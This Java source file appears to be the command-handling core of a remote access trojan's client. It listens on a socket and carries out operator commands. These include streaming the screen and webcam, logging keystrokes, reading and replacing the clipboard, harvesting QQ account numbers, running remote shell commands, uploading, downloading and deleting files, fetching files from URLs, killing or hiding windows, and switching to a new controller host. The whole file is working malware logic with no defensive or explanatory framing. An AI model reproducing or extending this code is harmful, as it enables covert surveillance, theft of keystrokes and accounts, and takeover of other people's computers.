package me.client.utils;

import com.sun.jna.NativeLong;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import me.client.Client;
import me.client.send.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

import static com.sun.jna.platform.win32.WinUser.SW_SHOW;

public class ReceiveMessage extends Thread{
    Socket socket;
    File file;
    SendScreen sendScreen;
    SendTaskList sendTaskList;
    SendSystemInfo systemInfo;
    CameraListen listen;
    RemoteChat chat;
    RemoteCmd remoteCmd;
    FileManage fileManage;
    SendQQNumber sendQQNumber;
    FlashBomb flashBomb;
    SetClipboard setClipboard;
    Getkeyboard getkeyboard;
    EnumWindows windows;
    LoadNewHost loadNewHost;
    FileOutputStream fileOutputStream;
    public ReceiveMessage(Socket socket) throws Exception{
        this.socket = socket;
    }
    @Override
    public void run() {
        try {
            while (true) {
                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                    Thread.sleep(1);
                    byte[] head = SendMessage.receiveHead(dataInputStream);
                    int lens;
                    byte[] context;
                    switch (head[0]) {
                        case MessageFlags.HEARTPACK:
                            //心跳包
                            break;
                        case MessageFlags.SHOW_SCREEN:
                            sendScreen = new SendScreen(socket);
                            sendScreen.run = true;
                            sendScreen.start();
                            break;
                        case MessageFlags.STOP_SCREEN:
                            sendScreen.run = false;
                            break;
                        case MessageFlags.SHOW_TASKLIST:
                            sendTaskList = new SendTaskList(socket);
                            sendTaskList.showTaskList();
                            sendTaskList.updateTaskList();
                            break;
                        case MessageFlags.UPDATE_TASKLIST:
                            sendTaskList = new SendTaskList(socket);
                            sendTaskList.updateTaskList();
                            break;
                        case MessageFlags.STOP_PROCESS:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String PIDstr = new String(context);
                            System.out.println(Integer.parseInt(PIDstr));
                            SendTaskList.stopProcess(Integer.parseInt(PIDstr));
                            break;
                        case MessageFlags.SHOW_SYSTEMINFO:
                            systemInfo = new SendSystemInfo(socket);
                            systemInfo.sendSystemInfo();
                            break;
                        case MessageFlags.SHOW_CAMERA:
                            listen = new CameraListen(socket);
                            listen.run = true;
                            listen.start();
                            break;
                        case MessageFlags.STOP_CAMERA:
                            listen.closeCamera();
                            break;
                        case MessageFlags.SHOW_REMOTECHAT:
                            chat = new RemoteChat(socket);
                            break;
                        case MessageFlags.SEND_REMOTECHAT:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            chat.update(context);
                            break;
                        case MessageFlags.STOP_REMOTECHAT:
                            chat.closeWindows();
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str = new String(context);
                                    String title = str.substring(str.indexOf("Title:") + 6,str.indexOf("Context:"));
                                    String mainContext = str.substring(str.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageErrorYNC(new WString(title),new WString(mainContext));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str1 = new String(context);
                                    String title1 = str1.substring(str1.indexOf("Title:") + 6,str1.indexOf("Context:"));
                                    String mainContext1 = str1.substring(str1.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageInformationYNC(new WString(title1),new WString(mainContext1));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str2 = new String(context);
                                    String title2 = str2.substring(str2.indexOf("Title:") + 6,str2.indexOf("Context:"));
                                    String mainContext2 = str2.substring(str2.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageWarningYNC(new WString(title2),new WString(mainContext2));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str3 = new String(context);
                                    String title3 = str3.substring(str3.indexOf("Title:") + 6,str3.indexOf("Context:"));
                                    String mainContext3 = str3.substring(str3.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageQuestionYNC(new WString(title3),new WString(mainContext3));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str4 = new String(context);
                                    String title4 = str4.substring(str4.indexOf("Title:") + 6,str4.indexOf("Context:"));
                                    String mainContext4 = str4.substring(str4.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageErrorYN(new WString(title4),new WString(mainContext4));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str5 = new String(context);
                                    String title5 = str5.substring(str5.indexOf("Title:") + 6,str5.indexOf("Context:"));
                                    String mainContext5 = str5.substring(str5.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageInformationYN(new WString(title5),new WString(mainContext5));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str6 = new String(context);
                                    String title6 = str6.substring(str6.indexOf("Title:") + 6,str6.indexOf("Context:"));
                                    String mainContext6 = str6.substring(str6.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageWarningYN(new WString(title6),new WString(mainContext6));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str7 = new String(context);
                                    String title7 = str7.substring(str7.indexOf("Title:") + 6,str7.indexOf("Context:"));
                                    String mainContext7 = str7.substring(str7.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageQuestionYN(new WString(title7),new WString(mainContext7));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str8 = new String(context);
                                    String title8 = str8.substring(str8.indexOf("Title:") + 6,str8.indexOf("Context:"));
                                    String mainContext8 = str8.substring(str8.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageErrorY(new WString(title8),new WString(mainContext8));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str9 = new String(context);
                                    String title9 = str9.substring(str9.indexOf("Title:") + 6,str9.indexOf("Context:"));
                                    String mainContext9 = str9.substring(str9.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageInformationY(new WString(title9),new WString(mainContext9));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str10 = new String(context);
                                    String title10 = str10.substring(str10.indexOf("Title:") + 6,str10.indexOf("Context:"));
                                    String mainContext10 = str10.substring(str10.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageWarningY(new WString(title10),new WString(mainContext10));
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str11 = new String(context);
                                    String title11 = str11.substring(str11.indexOf("Title:") + 6,str11.indexOf("Context:"));
                                    String mainContext11 = str11.substring(str11.indexOf("Context:") + 8);
                                    LoadDLL.instance.MessageQuestionY(new WString(title11),new WString(mainContext11));
                                }
                            }).start();
                            break;
                        case MessageFlags.SHOW_REMOTE_CMD:
                            remoteCmd = new RemoteCmd(socket);
                            SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD, socket);
                            break;
                        case MessageFlags.EXECUTE_REMOTE_CMD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            remoteCmd.cmdExecute(context);
                            break;
                        case MessageFlags.SHOW_FILEWINDOW:
                            fileManage = new FileManage(socket);
                            SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW, socket);
                            break;
                        case MessageFlags.FILE_QUERY:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.FileQuery(new String(context));
                            break;
                        case MessageFlags.FILE_OPEN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.OpenFile(new String(context));
                            break;
                        case MessageFlags.FILE_DELETE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.DeleteFile(new String(context));
                            break;
                        case MessageFlags.FILE_CREATEWITHNAME:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            file = new File(new String(context));
                            file.createNewFile();
                            break;
                        case MessageFlags.FILE_PREPARE:
                            fileOutputStream = new FileOutputStream(file);
                            break;
                        case MessageFlags.FILE_UPLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            try{
                                context = SendMessage.receiveContext(dataInputStream, lens);
                                fileOutputStream.write(context);
                            } catch (Exception e) {
                            }
                            break;
                        case MessageFlags.FILE_UPLOAD_END:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileOutputStream.close();
                            SendMessage.Send(MessageFlags.FILE_UPLOAD_OK,context,socket);
                            break;
                        case MessageFlags.FILE_DOWNLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.fileName = new String(context);
                            new Thread(fileManage).start();
                            break;
                        case MessageFlags.FILE_HTTPDOWNLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String strings = new String(context);
                            String[] pathAndUrl = strings.split("-path");
                            HttpDownload.download(pathAndUrl[0], new URL(pathAndUrl[1]));
                            break;
                        case MessageFlags.FILE_CREATE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            File file1 = new File(new String(context));
                            file1.createNewFile();
                            break;
                        case MessageFlags.SHOW_QQNUMBERWINDOW:
                            sendQQNumber = new SendQQNumber(socket);
                            sendQQNumber.SendQQNumbers();
                            break;
                        case MessageFlags.WEB_BROWSE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            Desktop desktop = Desktop.getDesktop();
                            if (desktop.isSupported(Desktop.Action.BROWSE)) {
                                desktop.browse(new URI(new String(context)));
                            }
                            break;
                        case MessageFlags.FLASH_SCREEN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            flashBomb = new FlashBomb(new String(context));
                            break;
                        case MessageFlags.BUZZER:
                            LoadDLL.instance.beep(new NativeLong(1000), new NativeLong(1000));
                            break;
                        case MessageFlags.SHOW_CLIPBORADWINDOW:
                            setClipboard = new SetClipboard(socket);
                            SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW, socket);
                            break;
                        case MessageFlags.GET_CLIPBORAD:
                            setClipboard.getClipboard();
                            break;
                        case MessageFlags.CHANGE_CLIPBORAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            setClipboard.setClipboard(new String(context));
                            break;
                        case MessageFlags.SHOW_KEYBORADWINDOW:
                            SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW, socket);
                            getkeyboard = new Getkeyboard(socket);
                            getkeyboard.run = true;
                            getkeyboard.start();
                            break;
                        case MessageFlags.CLOSE_KEYBORAD:
                            getkeyboard.run = false;
                            getkeyboard.setHookOff();
                            break;
                        case MessageFlags.SHOW_ENUM_WINDOWS:
                            windows = new EnumWindows(socket);
                            SendMessage.SendHead(MessageFlags.SHOW_ENUM_WINDOWS, socket);
                            windows.enumWindows();
                            break;
                        case MessageFlags.ENUM_WINDOWS:
                            windows.enumWindows();
                            break;
                        case MessageFlags.CLOSE_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String WindowsName = new String(context);
                            WinDef.HWND h = User32.INSTANCE.FindWindow(null, WindowsName);
                            LoadDLL.instance.StopWindowProcess(h);
                            break;
                        case MessageFlags.HIDE_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String str12 = new String(context);
                            WinDef.HWND h1 = User32.INSTANCE.FindWindow(null, str12);
                            User32.INSTANCE.CloseWindow(h1);
                            break;
                        case MessageFlags.SHOW_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String str13 = new String(context);
                            WinDef.HWND h2 = User32.INSTANCE.FindWindow(null, str13);
                            User32.INSTANCE.ShowWindow(h2, SW_SHOW);
                            break;
                        case MessageFlags.DISK_QUERT:
                            fileManage.DiskQuery();
                            break;
                        case MessageFlags.RELIEVE:
                            Client.relieve();
                            break;
                        case MessageFlags.KEY_PRESSED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s = new String(context);
                            sendScreen.KeyPress(s);
                            break;
                        case MessageFlags.KEY_RELEASED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s1 = new String(context);
                            sendScreen.KeyReleased(s1);
                            break;
                        case MessageFlags.MOUSE_PRESSED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s2 = new String(context);
                            sendScreen.MousePress(s2);
                            break;
                        case MessageFlags.MOUSE_RELEASED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s3 = new String(context);
                            sendScreen.MouseReleased(s3);
                            break;
                        case MessageFlags.MOUSE_MOVED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s4 = new String(context);
                            sendScreen.MouseMove(s4);
                            break;
                        case MessageFlags.MOUSE_DRAGGED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s5 = new String(context);
                            sendScreen.MouseDragged(s5);
                            break;
                            case MessageFlags.MOUSE_WHEEL:
                                lens = SendMessage.receiveLength(dataInputStream);
                                context = SendMessage.receiveContext(dataInputStream, lens);
                                String s6 = new String(context);
                                sendScreen.MouseWheel(s6);
                                break;
                        case MessageFlags.LOAD_NEWHOST:
                            loadNewHost = new LoadNewHost(socket);
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            loadNewHost.Load(new String(context));
                            break;
                    }
            }
        }catch (Exception e) {
        }
    }
}
